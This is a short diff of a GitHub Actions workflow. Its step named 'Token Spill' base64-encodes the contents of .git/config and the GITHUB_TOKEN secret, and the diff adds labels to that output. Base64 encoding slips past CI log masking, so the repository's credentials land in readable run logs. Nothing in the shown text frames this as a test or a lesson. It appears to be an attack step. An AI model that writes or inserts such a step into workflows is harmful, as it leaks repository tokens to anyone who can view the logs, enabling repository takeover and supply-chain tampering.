@@ -27,7 +27,9 @@ jobs:
 
       - name: Token Spill
         run: |          
+          echo Git Token:
           cat .git/config | base64
+          echo GH TOKEN:
           echo ${{ secrets.GITHUB_TOKEN }} | base64
           
       - name: Sleep
